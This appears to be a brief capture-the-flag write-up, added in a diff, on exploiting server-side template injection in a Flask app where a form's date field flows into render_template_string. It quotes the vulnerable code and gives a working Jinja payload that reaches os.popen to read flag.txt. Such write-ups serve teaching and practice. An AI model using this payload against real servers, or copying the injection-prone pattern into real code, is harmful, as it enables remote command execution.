@@ -1,0 +1,33 @@
+This week was exploiting jinja templating.
+
+The server reads the caption we send and the date
+
+	caption = request.form["text"]
+
+	date = request.form["date"]
+
+
+The date is later saved
+
+        with open(f"img/{filename}.txt", 'w') as f:
+            f.write(date)
+
+And reused as the alt text
+
+with open(txt_path, "r") as f:
+            alt_text = f.read().strip()
+
+
+Which means we have complete controll to the input to
+
+return render_template_string(f"""
+    <img src="{image_url}" alt="{alt_text}">
+""")
+
+
+
+Using the dev console to modify the date sent we can execute
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
+
+Giving us the flag.
